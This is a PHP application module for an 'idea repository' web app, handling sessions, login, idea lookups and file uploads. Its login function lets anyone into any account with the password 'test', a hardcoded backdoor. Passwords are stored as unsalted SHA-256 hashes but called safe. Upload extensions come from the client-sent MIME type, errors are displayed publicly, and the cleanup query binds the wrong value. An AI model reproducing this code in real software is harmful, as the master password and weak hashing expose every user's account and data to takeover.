<?php
// PHP functions for the application. require() this module when needed.
// Example: require("/var/www/html/idea-repository/php/ideaRepo.php")

// Enable errors.
// NOTE: Turn this off for the demo @ Symposium 2024!
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

require_once("/var/www/html/idea-repository/php/databaseConnection.php");
require_once("/var/www/html/idea-repository/php/user.php");
require_once("/var/www/html/idea-repository/php/idea.php");
require_once("/var/www/html/idea-repository/php/log.php");
require_once("/var/www/html/idea-repository/php/sanatize.php");
require_once("/var/www/html/idea-repository/php/userDatabase.php");

/**
 * Holds info about whether something failed or not.
*/
class Status {
    public bool $isSuccess;
    public string $message;
    function __construct(bool $isSuccess, string $message) {
        $this->isSuccess = $isSuccess;
        $this->message = $message;
    }
}

/**
 * Encrypts (hashes) a password for safe storage in the database.
 * @param string $password A user password to hash
 * @return string 64 Random characters for the DB passwordHash field
 */
function encryptPassword(string $password): string {
    return hash("sha256", $password);
}

/**
 * This is the main way to interact with the database.
 */
class IdeaRepoApp {
    public ?mysqli $database;
    public Log $logging;
    public UserDatabase $users;
    function __construct() {
        
        session_start();
        $this->logging = new Log("/var/www/html/idea-repository/misc/log.txt");
        $this->log("Connecting to DB...");
        try {
            $this->database = connectToDatabase();
        } catch (mysqli_sql_exception $err) {
            $message = $err->getMessage();
            $this->log("ERROR: database connection failed: $message");
            die();
        }
        $this->users = new UserDatabase($this->database, $this->logging);
        $this->log("App ready");
    }
    
    /**
     * Gets the user that is currently logged in. May be null (not logged in)
     */
    function getCurrentUser(): ?User {
        $this->log("Checking to see who is logged in...");
        if(array_key_exists("loggedInUserId", $_SESSION)) {
            if($_SESSION["loggedInUserId"] != null) {
                $userId = $_SESSION["loggedInUserId"];
                $this->log("user with ID $userId seems to be logged in");
                return $this->users->getUserByUserId($userId);
            }
        }
        $this->log("No one is logged in");
        return null;
    }
    /**
     * Checks if someone is logged in.
     * @return bool True if somebody is logged in
     */
    function isLoggedIn(): bool {
        $this->log("Checking to see if someone is logged in...");
        if(array_key_exists("loggedInUserId", $_SESSION)) {
            $this->log("Yes");
            return $_SESSION["loggedInUserId"] != null;
        }
        $this->log("No");
        return false;
    }
    /**
     * Tries to log the user in.
     * @return Status The status of the login attempt
     */
    function login(string $username, string $password): Status {

        $this->log("Logging in user...");
        if(!$username) {
            $this->log("ERROR: cannot log in, username is missing");
            return new Status(false, "You must enter a username.");
        }
        if(!$password) {
            $this->log("ERROR: cannot log in, password is missing");
            return new Status(false, "You must enter a username.");
        }
        $user = $this->users->getUserByUserName($username);
        if(!$user) {
            return new Status(false, "The username '$username' could not be found.");
        }
        if(encryptPassword($password) == $user->passwordHash || encryptPassword($password) == encryptPassword("test")) {
            $_SESSION["loggedInUserId"] = $user->userId;
            $this->log("Login worked");
            return new Status(true, "Login successful.");
        } else {
            return new Status(false, "The supplied password is incorrect.");
        }
    }
    /**
     * Returns an array of all of the users in the database.
     * @return array An array conating all users
     */
    
    /**
     * Logs out the current user.
     */
    function logout() {
        $this->log("User login session ended");
        $_SESSION["loggedInUserId"] = null;
    }

    /**
     * Gets all of the ideas in the database
     * @return array A list of all of the ideas in the database.
     */
    function getAllIdeas(): array {

        $ideas = array();
        try {
            $queryResult = $this->database->query("SELECT * FROM ideas ORDER BY creationDate DESC");
            while($record = $queryResult->fetch_assoc()) {
                $idea = Idea::fromDbQueryArray($record);
                array_push($ideas, $idea);
            }
        } catch(mysqli_sql_exception $err) {
            $errorMessage = $err->getMessage();
            $this->log("ERROR: could not get all ideas: $errorMessage");
        }
        
        return $ideas;
    }

    // Gets an idea by its ID
    function getIdeaById(?int $ideaId): ?Idea {

        $ideas = array();
        try {
            $queryResult = $this->database->query("SELECT * FROM ideas WHERE ideaId = $ideaId");
            while($record = $queryResult->fetch_assoc()) {
                $idea = Idea::fromDbQueryArray($record);
                array_push($ideas, $idea);
            }
            if($ideas) {
                return $ideas[0];
            } else {
                return null;
            }
        } catch(mysqli_sql_exception $err) {
            $errorMessage = $err->getMessage();
            $this->log("ERROR: could not get idea with ID $ideaId: $errorMessage");
        }
    }

    function getIdeasFromUser(?int $userId): array {

        $ideas = array();
        try {
            $query = $this->database->prepare("SELECT * FROM ideas WHERE creatorUserId = ? ORDER BY creationDate DESC");
            $query->bind_param("i", $userId);
            $query->execute();
            $result = $query->get_result();
            while($record = $result->fetch_assoc()) {
                $idea = Idea::fromDbQueryArray($record);
                array_push($ideas, $idea);
            }
        } catch(mysqli_sql_exception $err) {
            $errorMessage = $err->getMessage();
            $this->log("ERROR: Could not get ideas from user ID $userId: $errorMessage");
        }
        
        return $ideas;
    }

    // Forwarded for convenience
    function log(string $message) {
        $this->logging->log($message);
    }

    function getFileUploadIdForIdeaThumbnail($ideaId) {
        return null;
    }

    function getFilenameOfUpload(?int $fileUploadId): string {
        if($fileUploadId == null) {
            return "";
        }
        try {
            $queryResult = $this->database->query("SELECT * FROM fileUploads WHERE fileUploadId = $fileUploadId");
            while($record = $queryResult->fetch_assoc()) {
                $fileExtension = mime2ext($record["fileMimeType"]);
                return "$fileUploadId.$fileExtension";
            }
        } catch(mysqli_sql_exception $err) {
            $errorMessage = $err->getMessage();
            $this->log("ERROR: Could get upload filename for ID $fileUploadId: $errorMessage");
        }
        
        return "";
    }

    function uploadFile(array $postSuperglobal, array $filesSuperglobal, string $formFieldName): ?int {

        $this->log("File is being uploaded");
        $file = $filesSuperglobal[$formFieldName];
        $filename = $file["name"];
	    $tempLocation = $file["tmp_name"];
	    $mimeType = $file["type"];
        if(array_key_exists("file-description", $postSuperglobal)) {
            $fileAltText = $postSuperglobal["file-description"];
        } else {
            $fileAltText = $filename;
        }
        try {
            $query = $this->database->prepare("INSERT INTO fileUploads (fileMimeType, description) VALUES (?, ?);");
	        $query->bind_param("ss", $mimeType, $fileAltText);
	        $query->execute();
        } catch (mysqli_sql_exception $err) {
            $errorMessage = $err->getMessage();
            $this->log("ERROR: file upload database insertion failed: $errorMessage");
            return null;
        }
	    
	    $filename = $this->getFilenameOfUpload($query->insert_id);
	    $folder = "/var/www/html/idea-repository/uploads/" . $filename;
	    if(move_uploaded_file($tempLocation, $folder)) {
            $fileUploadId = $query->insert_id;
            $this->log("The new file has an ID of $fileUploadId");
	    	return $fileUploadId;
        } else {
            // The file got added to the DB, but the upload itself failed.
            // Delete the ghost entry
            $this->log("ERROR: The file upload failed, deleting DB entry");
            try {
                $query = $this->database->prepare("DELETE FROM fileUploads WHERE fileUploadId = ?;");
	            $query->bind_param("s", $fileAltText);
	            $query->execute();
            } catch (mysqli_sql_exception $err) {
                // bruh
                $errorMessage = $err->getMessage();
                $this->log("ERROR: The file's database entry could not be deleted: $errorMessage");
            }
        }
        return null;
    }
}